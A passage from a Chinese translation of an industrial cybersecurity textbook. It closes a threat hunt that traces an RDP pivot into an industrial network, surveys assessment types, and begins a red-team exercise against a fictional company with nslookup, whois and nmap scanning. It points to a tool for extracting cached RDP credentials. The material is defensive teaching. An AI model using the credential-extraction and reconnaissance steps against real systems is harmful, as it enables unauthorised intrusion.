  \n   ![](img/c8ffa9959721097701584fcc95101362_585_0.png)\n\n   图13.21 – 可疑企业系统 –\
  \ 222.222.222.222的登录事件\n\n屏幕底部那个源网络地址现在应该已经铭刻在你的脑海里了——222.222.222.222。为什么有两条记录？嗯，RDP使用两个或多个通道来分离服务，例如音频和视频。那是两条独立的连接，各有各的登录事件。\n\
  \n7. 对222.222.222.222执行Whois查询(https://ipinfo.io/222.222.222.222)应该让我们更加怀疑：\n\n\
  \   ![](img/c8ffa9959721097701584fcc95101362_586_0.png)\n\n   图13.22 – IPInfo.io对222.222.222.222的查询结果\n\
  \n8. 为了进行验证，这些连接与Zeek在相同时间记录的10.0.0.200和172.25.100.201之间的连接非常吻合：\n\n   **Security\
  \ Onion - 所有日志**\n\n   | 时间 | 源IP | 源端口 | 目标IP | 目标端口 |\n   |---|---|---|---|---|\n\
  \   | Jan 21, 2021 @ 13:09:21.674 | 10.0.0.200 | 59898 | 172.25.100.201 | 3389 |\n\
  \   | Jan 21, 2021 @ 13:09:21.456 | 10.0.0.200 | 49756 | 172.25.100.201 | 3389 |\n\
  \n   图13.23 – 将登录事件与工业区连接关联起来的验证\n\n我们可以相当确定，来自222.222.222.222到10.0.0.200的RDP连接被用来通过从10.0.0.200到172.25.100.201（Workstation1）的第二个RDP会话进入工业网络。该连接促成了SilentDefense报告的固件更新。\n\
  \n当然，我们需要验证来自222.222.222.222的用户没有正当理由进行此类活动。\n\n这超出了本次威胁狩猎的范围，但攻击者能够在企业网络和工业网络之间快速跳转的原因，是我们很多人都有的一个习惯——使用缓存的凭据。我们经常看到这种情况。为了方便，用户会在RDP客户端中存储（缓存）凭据：\n\
  \n![](img/c8ffa9959721097701584fcc95101362_587_0.png)\n\n图13.24 – 使用缓存凭据是**不好的**\n\
  \n对于通过恶意软件或某些漏洞入侵企业用户计算机（和账户）的攻击者来说，使用这些缓存的凭据不仅轻而易举，而且这些凭据的存储方式也不是很安全。有许多工具可以从Windows机器中提取（检索）保存的RDP凭据和其他存储的凭据。NirSoft网站提供了一些非常有用的选项：`https://www.nirsoft.net/utils/remote_desktop_password.html`。\n\
  \n我认为这相当明确地证明了我们的威胁狩猎假设：*存在进入工业环境的可疑外部连接。* 是的，绝对如此。\n\n让事件响应团队确定此事的影响范围和影响程度。\n\n\
  ### 总结\n\n在本章中，我们证明了我们的假设，即可疑的外部连接正在进入工业区。我们通过观察7天内在工业区发现的所有连接与工业设备的交互得出了这一结论。我们通过发现与可疑连接相关的异常来消除合法连接，并调查了企业网络上的可疑系统，以找到确凿证据，该证据来自发现从互联网上的一个中国IP地址进入企业系统的连接。\n\
  \n这结束了本书的*威胁狩猎*部分。下一章将是*第4部分，工业网络安全评估*的第一章。该第一章将介绍各种评估类型，这些类型可以帮助我们验证安全计划的有效性和正确性。\n"
- '# 第4部分：工业网络安全——安全评估与情报


  在本书的这一部分，我们将探讨可用于评估工业环境网络安全风险和态势的各种方法。


  本部分包含以下章节：


  - 第14章，不同类型的网络安全评估

  - 第15章，工业控制系统风险评估

  - 第16章，红队/蓝队演练

  - 第17章，ICS环境渗透测试

  '
- "# 14 不同类型的网络安全评估\n\n欢迎来到本书的第4部分：工业网络安全——安全评估与情报！在接下来的四章中，我们将深入了解安全评估。本章将以讨论通常在工业控制系统（ICS）环境中执行的各种评估类型，以及它们与常规信息技术（IT）环境中执行的安全评估有何不同来开始我们的讨论。在本章结束时，你将能够区分这些不同类型的评估。\n\
  \n我们将在本章中涵盖以下主题：\n\n- 理解网络安全评估的类型\n- 风险评估\n- 红队演练\n- 蓝队演练\n- 渗透测试\n- ICS/OT安全评估与IT有何不同？\n\
  \n## 理解网络安全评估的类型\n\n网络安全评估是一种系统性的活动，用于测试你当前的安全控制措施，并以可控且有条理的方式评估它们与已知漏洞的对抗情况。不同类型的（网络）安全评估可用于验证安全态势的不同部分，并验证整体网络安全计划。\n\
  \n在接下来的章节中，我们将涉及以下常见的网络安全评估类型：\n\n- 风险评估\n- 红队演练\n- 蓝队演练\n- 渗透测试\n\n我们将在接下来的章节中更详细地讨论这些评估，并针对这些方法论进行实际操作练习。\n\
  \n## 风险评估\n\n商业词典对风险评估的定义如下：\n\n> “识别、评估和估计某种情况下涉及的风险水平，将其与基准或标准进行比较，并确定可接受的风险水平。”\n\
  \n换句话说，风险评估旨在发现某种情况（例如系统或环境的设置）中可能出错的事项。通过发现该系统的缺陷或漏洞，可以确定出现问题可能性以及事件发生的影响。\n\n\
  ICS风险评估通常采用以下主要步骤：\n\n1. 资产识别\n2. 系统特征化\n3. 漏洞识别\n4. 威胁建模\n5. 风险计算\n6. 缓解措施优先级排序与规划\n\
  \n每个步骤的强度和范围将取决于**所考虑系统（SUC）**所实施的安全计划的成熟度。让我们简要回顾风险评估的这些主要步骤。\n\n## 资产识别\n\n本着*你不知道自己拥有什么就无法保护什么*的座右铭，这第一步——资产识别——可以说是风险评估过程乃至整个安全计划中最重要的步骤。在此步骤中，应尽可能多地（最好全部）发现风险评估目标环境中的资产。\n\
  \n资产发现和识别通过进行网络架构和文档审查、执行扫描，甚至对隐藏在生产线某个角落的资产进行物理盘点来执行。\n\n未在此步骤中识别的资产将不会参与风险评估过程的后续环节，因此应格外注意此步骤。\n\
  \n## 系统特征化\n\n系统特征化是围绕上一步发现的资产寻找具体信息和细节的过程。通过进行桌面演练、访谈和研究，我们旨在回答有关ICS资产的以下主要问题：\n\
  \n- 该资产的功能是什么？\n- 该资产在整个流程中的位置是什么？\n  - 该资产依赖什么？\n  - 其他哪些资产依赖该资产？\n- 谁拥有该资产？\n\
  - 该资产的价值是什么？\n- 该资产对整个生产过程的关键程度如何？\n\n\n\n\n\n能够回答这些问题使我们能够更轻松地评估资产或资产所属系统被入侵的可能性或入侵的影响，从而能够为资产计算出更准确的风险评分。风险评分将在稍后讨论。\n\
  \n## 漏洞识别\n\n风险评估过程中的下一步是漏洞识别。在此步骤中，我们尝试尽可能多地发现迄今为止已识别并表征的资产中的漏洞。我们可以使用多种技术来发现漏洞，既有手动的，也有自动的（使用工具）。我们将在\
  \ *第 15 章，工业控制系统风险评估* 和 *第 17 章，渗透测试 ICS 环境* 中介绍一些漏洞识别方法。\n\n## 威胁建模\n\n威胁建模是通过我们迄今为止收集的信息组合，尝试识别所有潜在风险场景的结构化过程。风险场景是描述威胁行为者（攻击者）如何利用资产中的漏洞的一种方式。威胁建模是\
  \ ICS 特定风险评估与常规 IT 评估最不同的地方。这也是让以 ICS 为中心的专业安全人员执行该任务最有价值的地方，我们将在 *第 15 章，工业控制系统风险评估*\
  \ 中详细讨论。\n\n## 渗透测试\n\n在此阶段，我想指出进行渗透测试以支持和扩展漏洞识别和威胁建模工作的好处。渗透测试可以增加对发现漏洞的验证，并允许进行更准确的可行性、可能性和影响评分，从而使整体风险评估更准确，并且由于能够在缓解优先排序和规划阶段做出可操作的决策，因此投资回报率会更高。\n\
  \n我们将在即将到来的 *渗透测试* 部分讨论渗透测试，并在 *第 17 章，渗透测试 ICS 环境* 中通过动手练习更详细地介绍。\n\n## 缓解优先排序和规划\n\
  \n风险评估的最后一步是对缓解工作的优先排序和规划。我们在风险评估过程中的前几个步骤做得越好，此任务就越容易完成，解决发现风险的计划也越有效。这就是正确执行风险评估步骤最能体现价值的地方。\n\
  \n风险评估及其所有活动和方法将在 *第 15 章，工业控制系统风险评估* 中详细讨论。我们接下来要谈论的下一类评估是红队评估。\n\n## 红队演练\n\n\
  红队演练是对组织进行的全方位攻击参与，目的是不择手段地尝试获取对系统的访问权限。红队演练通常包括以下活动：\n\n- 侦察活动，包括公开数据收集、**开源情报\
  \ (OSINT)** 收集以及其他公开可用信息收集活动\n- 网络渗透测试（尝试通过线路进入）\n- 物理突破尝试（尝试通过前门进入）\n- 测试是否存在 **普通老式电话系统\
  \ (POTS)** 调制解调器访问（战时拨号），这在工业领域尤其有价值，因为调制解调器经常是被遗忘的进入 ICS 网络的接入点，由设备供应商在 90 年代安装后就被遗忘了\n\
  - 测试所有存在的无线和 **射频 (RF)** 系统是否存在潜在的无线访问（无线驱动和 RF 黑客攻击）\n- 通过社会工程和网络钓鱼尝试测试员工\n\n简而言之，红队演练是由受过训练的网络安全和\
  \ ICS 专业人员团队进行的真实攻击，他们受雇于测试系统或组织的物理安全、网络安全和人力防御。\n\n红队演练的目标是尽可能真实地模拟攻击，就像攻击者攻击受害者的方式一样。这种方法对所执行的组织而言最有价值，关于此类攻击成功的可能性，结果可以直接用于更好地防御系统和组织。红队演练还允许防御者了解其检测系统的工作效果，以及相关的响应计划。\n\
  \n许多工业组织并不能完全控制其系统安全的所有方面。他们可能已将设施的物理安全外包给一家公司，将网络安全监控外包给另一家公司，并且还可能使用承包商和外部公司来保障其业务的\
  \ IT 方面。考虑到只要外包安全计划中最薄弱的环节出现故障就会导致安全漏洞成功，因此测试安全计划的所有方面以确定最薄弱的点非常重要。出于这个原因，红队演练应模仿有动机的攻击者会遵循的相同流程。\n\
  \n## 红队演练与渗透测试有何不同？\n\n虽然红队演练和渗透测试的预期结果相似，但这两种安全评估的方法和重点却大不相同。\n\n红队演练和渗透测试之间的第一个区别涉及安全评估的范围。渗透测试通常更专注于特定的系统或（网络）应用程序，并且评估是在与组织团队成员共享的时间表内进行的。另一方面，红队演练将在参与期间尝试利用多个系统和应用程序。此外，渗透测试通常集中于测试技术，而红队演练将涵盖测试技术，并且通常还包括社会工程和物理安全测试。\n\
  \n红队演练与渗透测试之间的第二个区别是使用的对手攻击仿真水平。渗透测试人员通常使用通用工具和技术来实现其目标，而红队成员将使用自定义工具、技术和方法，基于网络犯罪分子使用的真实攻击场景。攻击涵盖组织本身，也包括供应链合作伙伴或其他非常规途径。\n\
  \n红队评估将在 *第 16 章，红队/蓝队演练* 中详细讨论。我们接下来要谈论的下一类评估是蓝队评估。\n\n## 蓝队演练\n\n与红队演练一样，蓝队演练涉及一组网络安全专家，他们评估系统或组织以识别影响组织拥有的设备或关键系统的任何潜在漏洞。然而，红队演练通常会尝试利用发现的漏洞，而蓝队演练旨在找到提高避免、阻止、抵御和应对所发现潜在威胁的能力的可行方法。蓝队演练的最终目标是找到提高组织拥有的所有电子资产可靠性的方式，无论是内部托管还是外部托管。蓝队成员负责监控、检测和应对安全威胁，并且应主要为组织的员工。\n\
  \n蓝队演练应围绕对组织具有现实针对性的真实威胁进行建模（可操作的演练）。在蓝队演练期间，红队将攻击组织的资产以尝试查找和利用系统、设备和网络中应用程序的漏洞。蓝队的目标是检测和应对这些攻击并采取必要的措施隔离受影响的资产和系统。\n\
  \n如果执行得当，蓝队演练将成为受控的攻击模拟，测试安全监控和响应团队的有效性以及其检测、阻止和缓解攻击和入侵的能力。\n\n与渗透测试人员和红队成员使用通用工具和技术或即时创建工具来帮助查找和利用漏洞一样，蓝队成员也使用工具来监控网络流量并允许他们创建特定的检测机制，帮助他们快速识别正在发生的攻击。蓝队使用的一些工具包括以下内容：\n\
  \n- **入侵检测和预防系统 (IDS/IPS)**：这些工具将作为识别和防止攻击的第一道防线。\n- **数据包嗅探和分析工具**：这类工具允许蓝队成员捕获、分析和拼凑网络中传输的各个数据包。\n\
  - **事件日志和数据包聚合工具**：这些工具通常用于组织网络流量和设备日志以帮助攻击分析。通过日志聚合，蓝队可以重现导致入侵的攻击链或事件，这使蓝队能够分析网络攻击的行为。\n\
  - **端点检测/保护和响应工具**：这些工具允许蓝队跟踪和上下文化端点上的所有内容。端点保护工具可以在端点受到攻击时发出警报、防止攻击并提供帮助，为蓝队提供宝贵的见解。\n\
  \n\n\n\n## 蜜罐\n\n蜜罐是故意部署的具有诱惑性的（诱饵）资产，旨在让它们看起来像有价值的目标，并被有意设计成容易被攻破。蜜罐让蓝队能够检测和分析攻击，而且往往是最先发现新漏洞利用的。它们还能帮助蓝队更好地理解攻击者如何攻击和入侵蜜罐主机，这反过来也有助于更好地保护蜜罐所仿真的真实生产系统。\n\
  \n蓝队评估将在*第16章“红队/蓝队演练”*中详细讨论。接下来我们要讨论的评估类型是渗透测试。\n\n## 渗透测试\n\n在开始讨论渗透测试之前，为了说明各种评估类型之间的差异、相似之处以及重叠部分，我们先简要概述一些相关的网络安全评估类型。这些评估类型大多在前面已经讨论过，但在此重述，以便把各种评估类型放在整体视角中来看。\n\
  \n四种主要的网络安全评估类型如下：\n\n- **差距分析**将当前的缓解控制措施与NIST等标准机构提供的推荐安全控制清单进行比较。该方法寻找系统现有防御机制与推荐机制之间的偏差或**差距**。通过审查网络架构图和系统配置等活动来识别这些差距。\n\
  - **漏洞评估**通过将设备当前的补丁级别或应用程序版本与针对该补丁级别或应用程序版本的已知漏洞清单进行比较，来发现ICS资产或整个系统中的漏洞或缺陷。\n\
  - **风险评估**是对系统风险暴露程度的全面评估。该评估包括差距分析和漏洞分析，以创建风险场景或风险地图，这些是针对被评估系统可能遭受的攻击而制定的策略化场景。风险评估会计算系统的风险评分，当与渗透测试结合时，可以针对被评估系统的整体风险状况提供非常准确、可操作且相关的洞察。借助这些风险评分，可以设计出更有针对性和更有效的风险缓解计划，从而最大化所实施控制措施的投资回报。\n\
  - **渗透测试**，或通常被称为**pen test**、**pentest**或**道德黑客演练**，是一种经过授权的模拟网络攻击，针对生产系统、生产设施或整个组织进行，用于评估系统的安全水平。与漏洞评估一样，渗透测试会尽可能多地发现目标安全态势中的缺陷/差距。但与漏洞评估不同的是，事情并不会止步于此。渗透测试会像攻击者那样，利用漏洞利用代码、工具和其他攻击手段攻击目标，评估已发现漏洞被利用的可能性和难易程度。根据约定范围，资产可能会被实际利用，以证明这种利用是可行的。\n\
  \n这种对利用可能性和难易程度的评估，使渗透测试成为风险评估过程的绝佳补充。现在，我们可以把可操作的数字放在风险评分公式的可能性因子后面，而这一评分原本是很难衡量的。\n\
  \n> **注意**\n> 将差距分析与漏洞评估相结合，并通过渗透测试验证发现，是启动安全计划的安全改进周期并开始消除更细微问题的首选风险评估和风险检测方法。\n\
  \n现在我们已经定义了不同类型的网络安全评估方法，接下来让我们仔细看看道德黑客演练中的渗透测试具体包含哪些内容。\n\n道德黑客演练的典型流程包括以下步骤：\n\
  \n1. **规划与侦察**：这一阶段包括以下活动：\n    - 确定测试的范围和目标，包括要评估的系统（以及哪些系统是禁区！）以及允许使用的测试方法。\n\
  \    - 情报收集（例如，网络子网范围、域名、关键服务器的名称或IP地址，以及其他重要设备）。情报数据旨在更好地了解目标系统或组织的运作方式，并提示可能被发现的潜在漏洞。\n\
  2. **扫描与漏洞发现**：此步骤涉及查明被评估系统在服务方面暴露了什么（开放的网络端口、API，或系统及系统上运行的应用程序的其他访问/输入点），并查看是否可以通过这些访问/输入点发现任何漏洞。\n\
  \    这通常通过以下方法完成：\n    - 网络扫描工具\n    - 手动和自动漏洞评估工具\n    - 自定义脚本和代码\n    - 模糊测试工具\n\
  \    - 用于发现系统或设备接口（硬件输入）中设计缺陷的逻辑分析仪\n    - 硬件调试接口查询技术\n\n    > **信息说明**\n    > 模糊测试器（fuzzer）是一种软件，它可以生成伪随机输入并将其发送到系统或应用程序的输入端口，目的是使该系统崩溃，从而暴露漏洞。\n\
  \n3. **获取访问权限**：在此阶段，将尝试利用所发现的漏洞。这可以通过使用来自公共资源的漏洞利用代码、诸如Metasploit（https://www.metasploit.com/）之类的漏洞利用框架，或专门为攻击新发现的漏洞（**0-day漏洞**）而构建的自定义工具来实现；也可以采用现成工具无法做到的特定方式来攻击被评估的系统。\n\
  4. **维持访问权限**：此阶段的目标是评估该漏洞是否可用于在被利用的系统上实现持久化。持久化使攻击者能够深入了解其已入侵的环境，并用于为攻击的下一阶段做准备，或留出足够的时间来窃取有价值的数据。作为防御者，我们的任务是尽可能让攻击者难以入侵我们的系统，这让我们有时间通过安全监控活动来发现他们的活动。\n\
  \n> **注意**\n> 根据渗透测试所针对的组织架构以及商定的范围，步骤2、3和4可能需要多次执行，例如，先获取企业网络的访问权限，然后再攻击工业网络。\n\
  \n5. **渗透测试活动分析**：渗透测试的结果应汇编成一份报告，详细说明以下内容：\n    - 被利用的具体漏洞\n    - 被访问到的任何敏感数据\n\
  \    - 发现渗透测试人员在环境中活动所花费的时间\n    - 通往胜利的路径\n\n工业环境的渗透测试将在第17章*《ICS环境渗透测试》*中详细讨论。我们还将在此章中进行一次示例性的道德黑客演练。\n\
  \n## ICS/OT安全评估与IT评估有何不同？\n\n在本章中，我们已经讨论了ICS（网络）安全评估与纯IT导向评估之间每种评估类型的一些关键差异。\n\n\
  总的来说，请记住，在工业环境中扫描设备和识别漏洞，需要采用与典型IT环境中扫描和探测不同的方法。\n\n在大多数情况下，IT系统或网络上的设备可以重新启动、从备份中恢复或更换，而对IT资源用户的服务几乎没有中断或完全没有中断。\n\
  \n另一方面，ICS控制的是物理过程，因此，过度扫描和探测所造成的服务中断可能会带来现实世界的后果，包括物理损坏，甚至是对人的生命或环境的伤害。\n\n因此，漏洞评估应仅限于对ICS网络进行被动扫描，尽可能减少与ICS网络的交互。\n\
  \n尽管主动扫描和渗透测试等更具侵入性的评估被认为是必要的，但这些测试应在测试系统或实验室环境中进行。在该环境中，一个具有相同固件和应用程序版本的近似ICS网络将作为（高强度）漏洞扫描和渗透测试等活动的测试平台。\n\
  \n\n\n## 摘要\n\n在本章中，我们探讨了在 ICS 环境中执行（网络）安全评估的各种方法。我们简要介绍了风险评估、红队与蓝队演练以及渗透测试的概念。最后，我们讨论了\
  \ ICS 安全评估与其纯 IT 导向的评估之间的区别。\n\n在下一章中，我们将详细审视 ICS 风险评估，并深入讨论涵盖工业环境风险评估的阶段、步骤和活动。\n"
- '# 15 工业控制系统风险评估


  在本章中，我们将深入探讨工业控制系统（ICS）风险评估的细节。本章将从简短讨论信息技术（IT）与 ICS 网络攻击在目标和方法上的差异开始。随后，在着手进行 ICS
  特定的评估之前，我们将探索 IT 系统风险评估背后的不同方法和技巧。读完本章后，你应该对执行 ICS 特定风险评估所涉及的内容有深入的理解。


  本章将涵盖以下主题：


  - 理解 ICS 网络攻击的攻击阶段和最终目标

  - 风险评估

  - 资产识别

  - 系统特征分析

  - 漏洞识别

  - 威胁建模

  - 风险计算

  - 风险缓解优先级排序


  整章内容可以在 GitHub 上找到：`https://github.com/PacktPublishing/Industrial-Cybersecurity-Second-Edition/blob/main/Chapter_15_Industrial_Control_System_Risk_Assessments.pdf`

  '
- "# 16 红队/蓝队演练\n\n是时候通过黑客工具和攻击策略来享受一些乐趣了，因为在本章中，我们将讨论红队/蓝队演练，并且我们将亲自执行一些活动。到本章结束时，你将更熟悉红队成员基于现实世界攻击等效物常用的**战术、技术和程序（TTPs）**。\n\
  \n本章将涵盖以下主题：\n\n- 红队 vs 蓝队 vs 渗透测试\n- 红队/蓝队示例演练，攻击*公司 Z*\n\n## 红队 vs 蓝队 vs 渗透测试\n\
  \n我们在*第 14 章，不同类型的网络安全评估*中简要讨论了红队演练与渗透测试之间的区别，但让我们从实际的角度来看看。在实践中，这两种评估有何不同，以及蓝队在整个大局中扮演什么角色？\n\
  \n## 渗透测试的目标——不惜一切代价达成目标\n\n通常，渗透测试是受时间限制的技术评估，旨在实现特定的最终目标——例如，窃取敏感数据或某种秘密配方，获得**信息技术（IT）**或**运营技术（OT）**域管理员权限，修改生产系统，或抓取生产数据。渗透测试演练中使用的\
  \ TTPs 通常源自现实世界的攻击，但不一定针对渗透测试参与方的目标专门开发或设计。\n\n理想情况下，当你认为万事俱备（“你的鸭子排成一行”）并希望有人来验证这一假设时，才应进行渗透测试。渗透测试可以是基于网络的、物理的、社会工程的、钓鱼的或专注于应用程序的攻击，或者是所有这些攻击的组合。\n\
  \n渗透测试的结果通常是一份报告，其中列出了目标环境中发现的漏洞以及渗透测试人员利用所发现漏洞的方法。渗透测试报告（结果）通常用于在风险评估中加入可能性因素，从而更好地规划缓解工作，因为结果将显示哪种风险最有可能被成功利用。\n\
  \n## 红队演练的目标——模拟现实世界对手的 TTPs\n\n与渗透测试不同，红队演练是长期的或有时是持续性的基于活动的评估，旨在尽可能密切地模拟目标在现实世界中的对手\
  \ TTPs，目的是提高组织的安全检测能力、响应程序以及针对这些攻击的整体防御质量。通常，负责检测、响应和防御活动的团队是组织的蓝队。\n\n红队参与的结果（报告）将用于增强组织的检测、响应和防御能力，因为演练指出了这些方面的弱点。\n\
  \n## 蓝队的目标——尽可能快速检测并响应安全事件\n\n蓝队就是那些始终保持在线、随时待命，并应时刻警惕任何恶意活动迹象的人。蓝队将使用各种工具、技术以及支持和发现系统，这些系统使他们能够检测/发现其所监控环境中的异常行为。公司可能会决定在红队演练或渗透测试期间不通知其蓝队，以测试其响应能力和有效性。\n\
  \n让我们来看一个动手实践的红队/蓝队演练。\n\n## 红队/蓝队示例演练，攻击公司 Z\n\n在本节中，我们将概述执行以工业控制系统（ICS）为中心的红队/蓝队演练所涉及的步骤和活动。该演练围绕一家虚构的组织展开，恰如其分地命名为公司\
  \ Z。我们将在以下各节中回顾演练的前置条件、准备工作、实施和结果。\n\n## 红队策略\n\n红队的策略很简单：使用演练目标潜在对手可能使用的相同战术、技术和程序（TTPs）达成参与目标。时间不是一个因素，因此我们可以花费任意多或任意少的时间。目标是尽可能保持低调，但被检测到不应被视为失败，而应作为目标蓝队能力胜任程度的指标。\n\
  \n## 蓝队准备\n\n俗话说得好，作为安全的防御者，我们需要一直是对的，而攻击者只需要对一次。这对我们的蓝队也适用，他们需要时刻警惕，并且需要确保他们的工具运行正常并经过良好调优，以便能在恶意行为者或内容出现在环境中时捕获它们。这是一项艰巨的任务，但这里有五条一般性建议可以帮助蓝队为日常活动做准备：\n\
  \n- **理解正在监控的环境**\n\n    对蓝队来说，最重要的是理解正在监控的环境。有哪些系统、设备和设备到位，目前应用了哪些类型的控制措施？我们对环境及其在该环境中通常发生的情况了解得越多，就越容易在该环境中发现异常活动。\n\
  \n- **确保相关数据正在被收集且可被分析**\n\n    蓝队会对来自受监控环境的数据做出反应。拥有适当的收集和分析工具来帮助收集、关联和分析与安全相关的数据，对于蓝队运营的成功至关重要。投资一套**安全信息与事件管理（SIEM）**解决方案，并针对适当选择的攻击场景对其围绕的环境进行调优。\n\
  \n    此外，拥有日志记录和跟踪解决方案供蓝队记录其发现和活动，将允许日后审查这些发现和活动，有助于更好地监控环境的安全。\n\n- **使用适合受监控环境的工具**\n\
  \n    蓝队所需的工具类型由受监控的环境决定。需要选择那些能最大程度提供与环境交互视图的工具，并且团队成员应该对这些工具了如指掌。\n\n- **蓝队中要有经验丰富的成员**\n\
  \n    与其他大多数事情一样，执行安全监控的经验是蓝队最有价值的工具。知道正常行为和恶意行为之间的区别需要经验，因此蓝队至少一半的成员应该具备监控环境安全的足够经验。他们可以教导其他人，使其他人也变得熟练。\n\
  \n\n\n\n\n- **采取“假设已失陷”的立场**\n\n  在处理蓝队活动时，应以系统已被攻陷为前提假设。采取“假设已失陷”的立场，有助于将团队的心智模式转向发现恶意行为者和恶意内容。团队成员应将时间用于证明入侵正在进行，而不是试图证明一切正常且安全。\n\
  \n我们现在将开始实际的攻击演练。这部分内容将从红队视角出发，逐步讲解攻击的各个阶段。在每个阶段结束时，我会指出蓝队可以如何检测该阶段的活动。\n\n## 攻击\n\
  \n正如我们在 ICS 网络杀伤链中讨论的，对工业环境的攻击通常是对通用 IT 环境攻击的延伸。攻击往往始于对企业网络的攻陷，随后攻击者会寻找途径进入工业环境（除非他们运气足够好，找到的公司其企业网络和工业网络/环境是同一体系的）。只有当成功从企业侧横向移动到工业侧时，攻击策略和方法才开始出现差异。即使在\
  \ OT 网络上，攻击战术、技术和程序（TTP）在大多数情况下仍与企业侧相似；然而，真正的攻击目标在此处才会展开。对企业系统的攻击只有一个目标——找到通往工业环境的入口（一旦攻击者切换到\
  \ OT 侧），目标就会多样化，从窃取专有信息或产品秘密配方，到更阴险的目的，如生产中断，甚至对设备造成物理损坏或伤害人员。\n\n正如 ICS 杀伤链额外增加了若干针对工业攻击最终目标的步骤一样，执行红队演练的方法也需要增加相应步骤。以下是我们在\
  \ *Company Z* 执行红队任务时将采取的步骤：\n\n- 准备工作\n- 侦察（*Company Z* 侦察）\n- 初步立足——攻陷企业网络\n-\
  \ 企业网络侦察\n- 在企业网络中的横向移动\n- 切入工业网络\n- 工业网络侦察\n- 实现演练目标\n\n最后，我们将审视此次任务的结论，并讨论演练中的经验教训。\n\
  \n## 准备工作\n\n红队演练应当明确定义，并妥善处理以下细节：\n\n- **范围与限制**\n\n  哪些**互联网协议（IP）**地址/**子网**、设备、网络和地点属于范围内，以及哪些类型的攻击是被允许的。我们可以执行网络攻击、物理攻击、钓鱼、社会工程攻击、无线攻击、模糊测试等吗？别忘了讨论允许使用的工具类型。我们可以使用扫描器、模糊测试工具或漏洞利用框架吗？或者也可以使用恶意软件、零日漏洞等？\n\
  \n  限制生产环境中敏感设备的使用可能也有意义，明确界定哪些是禁止区域；或者采取相反的方法，清晰且排他性地定义生产网络中**属于范围内**的部分。\n\n-\
  \ **时间框架**\n\n  虽然红队任务通常是长期性的，但在评估的某些阶段何时执行仍需要一定的约束。你可能不希望在努力满足生产需求的同时，有人可能在使系统崩溃。此外，你可能希望确保蓝队有一定程度的在场，或者让攻击轮换经过所有团队成员，以便更好地评估整个蓝队。\n\
  \n  严格计时工业攻击部分，并将其安排在生产停机期间，或者至少让部分生产人员参与进来，也是一个好主意。在出现意外时，有人在现场并了解情况可能会派上用场。\n\n\
  - **紧急联系人**\n\n  在出现问题时，定义双方各自的紧急联系人。\n\n## 目标\n\n这里讨论的不是红队演练对目标方（Company Z）的目标。正如之前所讨论的，进行红队评估的目的是测试组织蓝队的有效性。这里指的是红队的目标；何时可以认为任务完成；最终目标；终点线。因此，红队的目标是渗透进\
  \ Company Z 的工业环境，并在名为 Test_Left 的可编程逻辑控制器（PLC）上安装新的固件。除公司名称外没有提供任何信息，且所有工具、方法和战术均可使用。一旦进入工业环境，只有工作站、服务器和前述的\
  \ PLC 在范围内——其他一切均被禁止。\n\n任务大纲应被良好记录、双方一致同意并签署。这确保双方都不会遇到意外或误解。\n\n明确了这些，让我们从对公司\
  \ Z 执行侦察开始红队任务。\n\n## 侦察\n\n红队任务的侦察阶段是我们尽可能多地收集关于目标相关信息的地方。至少，我们应该弄清楚目标的物理存在（他们的位置），以及其网络存在（他们拥有的公网\
  \ IP 地址范围）和所采用的技术——例如，他们是西门子/罗克韦尔/艾默生体系吗？他们是否运行分布式控制系统（DCS）？他们如何将技术堆栈的各部分联系在一起？等等；以及所用技术的具体细节（品牌、补丁级别/软件版本、维护实践、供应商、上下游合作伙伴等）。侦察通常是一个持续的过程，在整个任务过程中不断构建和扩展。你可能从攻击单一地点开始，但随后发现需要获取第二个地点，或可能允许在第一个地点攻击无效时提供访问权限的供应商或承包商的信息。\n\
  \n## 查找公司的公网 IP 地址范围\n\n为了简化示例中的红队任务，我们假设 Company Z 在单一物理地点运营，我们已经找到了该地址，并进行了 Google\
  \ 街景监控以评估我们将面对的情况。\n\n在我们拿着发光的通用串行总线（USB）驱动器冲入 Company Z 的生产工厂之前，让我们首先看看能否在不闯入的情况下获得立足点，利用互联网这个虚拟领域。我们将通过识别公司\
  \ Z 拥有的互联网 IP 地址（公网 IP 地址范围或无类别域间路由（CIDR））来评估公司 Z 的网络存在。我们可以使用该列表评估是否有系统在这些地址上响应，甚至是可能存在配置错误从而让我们得以进入的情况。\n\
  \n要查找一家公司使用的公网地址范围，我们对该公司网站 IP 地址进行 WHOIS 查询。要查找公司 Z 网站的 IP 地址，我们首先对 companyZ.com\
  \ 执行 nslookup 操作，如下所示：\n\n```\nnslookup companyZ.com\nServer:        1.1.1.1\nAddress:\
  \       1.1.1.1#53\n\nNon-authoritative answer:\nName:  companyz.com\nAddress: 10.0.0.120\n\
  ```\n\n手持其网站的公网 IP 地址，我们进行 WHOIS 查询以了解公司公网备案的详细信息，如下所示：\n\n```\n$ whois 10.0.0.120\n\
  #\n# ARIN WHOIS data and services are subject to the Terms of Use\n# available at:\
  \ https://www.arin.net/resources/registry/whois/tou/\n#\n# If you see inaccuracies\
  \ in the results, please report at\n# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/\n\
  #\n# Copyright 1997-2021, American Registry for Internet Numbers, Ltd.\n#\nNetRange:\
  \      10.0.0.0 - 10.0.0.255\nCIDR:          10.0.0.0/24\nNetName:       CompZ\n\
  NetHandle:     NET-10-0-0-0-1\n```\n\n\n\n| 父节点 | NET0 (NET-0-0-0-0-0) |\n|---|---|\n\
  | 网络类型 | 直接分配 |\n| 源AS | |\n| 组织 | Z 公司 - 强攻工控系统 |\n| 注册日期 | 2014-01-13 |\n| 更新时间\
  \ | 2017-03-12 |\n| 参考链接 | https://rdap.arin.net/registry/ip/10.0.0.0 |\n\n通过两次简单的公开信息查询，我们现在得知\
  \ *Z 公司* 拥有公共 IP 地址范围 10.0.0.0 - 10.0.0.255。\n\n不过请注意，聘请你进行红队演练的公司通常会指定 IP 地址范围（合同边界）。然而，在本练习中，我们将忽略这一事实，同时也忽略\
  \ 10.0.0.0 是 A 类私有地址范围这一事实。\n\n## 对网络范围进行初步扫描\n\n既然我们已经知道 *Z 公司* 拥有的 IP 地址范围，我们便可以开始探测该范围，以查找暴露的服务和弱点。我们将保持简单，使用\
  \ **Nmap** 来完成这项任务。我们执行以下扫描：\n\n```\n$ sudo nmap 10.0.0.0/24 -n -Pn --open\nHost\
  \ discovery disabled (-Pn). All addresses will be marked\n'up' and scan times will\
  \ be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-02-22 19:39 MST\n\
  ```\n\n我们告诉 **Nmap** 使用 `-n` 不进行 **域名系统（DNS）** 查询，使用 `-Pn` 将 10.0.0.0/24 范围内的所有\
